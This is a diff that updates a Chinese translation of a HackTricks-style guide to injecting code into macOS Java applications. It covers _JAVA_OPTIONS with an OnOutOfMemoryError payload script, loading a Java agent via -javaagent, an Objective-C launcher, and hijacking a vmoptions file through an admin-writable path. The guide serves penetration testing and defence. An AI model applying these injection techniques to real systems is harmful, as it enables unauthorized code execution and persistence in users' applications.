@@ -1,10 +1,10 @@
-# macOS Java 应用程序注入
+# macOS Java Applications Injection
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## 枚举
 
-查找系统中已安装的 Java 应用程序。经发现，**Info.plist** 中的 Java 应用程序会包含一些含有字符串 **`java.`** 的 Java 参数，因此可以搜索该字符串：
+查找系统中已安装的 Java applications。经发现，**Info.plist** 中的 Java apps 会包含一些含有字符串 **`java.`** 的 Java parameters，因此可以搜索该字符串：
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -14,13 +14,13 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA_OPTIONS
 
-环境变量 **`_JAVA_OPTIONS`** 可用于在执行已编译的 Java 应用时注入任意 Java 参数：
+环境变量 **`_JAVA_OPTIONS`** 可用于在 Java 应用程序启动时注入任意 Java VM 参数。<sup>[[1]](#references)</sup>
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
 ```
-要将其作为新进程执行，而不是作为当前终端的子进程执行，可以使用：
+要将其作为新进程执行，而不是当前终端的子进程，可以使用：
 ```objectivec
 #import <Foundation/Foundation.h>
 // clang -fobjc-arc -framework Foundation invoker.m -o invoker
@@ -73,7 +73,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-不过，这会在被执行的 app 上触发错误；另一种更隐蔽的方法是创建一个 Java agent 并使用：
+然而，该技术会在执行的 application 中触发错误。更隐蔽的替代方案是创建一个 Java agent，并使用 `-javaagent`：<sup>[[2]](#references)</sup>
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -83,9 +83,9 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
 > [!CAUTION]
-> 使用与应用程序**不同的 Java 版本**创建 agent，可能会导致 agent 和应用程序的执行崩溃
+> 使用与应用程序**不同的 Java 版本**创建 agent 可能会导致 agent 和应用程序同时崩溃。
 
-agent 可以是：
+agent 可以位于：
 ```java:Agent.java
 import java.io.*;
 import java.lang.instrument.*;
@@ -102,7 +102,7 @@ err.printStackTrace();
 }
 }
 ```
-编译 agent 的命令：
+要编译 agent，请运行：
 ```bash
 javac Agent.java # Create Agent.class
 jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
@@ -114,7 +114,7 @@ Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-然后导出 env 变量，并运行 Java 应用程序，如下：
+然后导出 env 变量并运行 Java 应用程序，如下所示：
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -125,12 +125,12 @@ open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Profession
 ```
 ## vmoptions file
 
-该文件支持在执行 Java 时指定 **Java params**。你可以使用之前的一些技巧来修改 Java params，并 **使该进程执行任意命令**。\
-此外，该文件还可以通过 `include` directory **包含其他文件**，因此你也可以修改被包含的文件。
+此文件支持在执行 Java 时指定 **Java parameters**。你可以使用之前的一些技术来更改 Java parameters，并 **make the process execute arbitrary commands**。\
+此外，此文件还可以使用 `include` directive **include other files**，因此你也可以更改被包含的文件。
 
-更进一步，某些 Java 应用会 **加载多个 `vmoptions`** 文件。
+更进一步，一些 Java apps 会 **load more than one `vmoptions`** file。
 
-一些应用（如 Android Studio）会在其 **output 中指出它们正在查找这些文件的位置**，例如：
+某些应用程序（例如 Android Studio）会在其 **output where they look** for these files：<sup>[[3]](#references)</sup>
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -141,7 +141,7 @@ open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Profession
 2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 ```
-如果它们没有，你可以轻松使用以下方法进行检查：
+如果没有，你可以使用以下命令进行检查：
 ```bash
 # Monitor
 sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
@@ -149,6 +149,11 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-注意，在这个示例中，Android Studio 试图加载文件 **`/Applications/Android Studio.app.vmoptions`**。该位置允许 **`admin` 组中的任何用户写入。**
+请注意，在此示例中，Android Studio 会尝试加载 **`/Applications/Android Studio.app.vmoptions`**，而 **`admin` 组中的任何用户都对该位置拥有写入权限**。
 
+## References
+
+- [1] [OpenJDK — `arguments.cpp` 中的 `_JAVA_OPTIONS` 解析](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
+- [2] [Oracle Java — `java.lang.instrument` 包规范](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
+- [3] [JetBrains — 配置 JVM 选项和平台属性](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
 {{#include ../../../banners/hacktricks-training.md}}
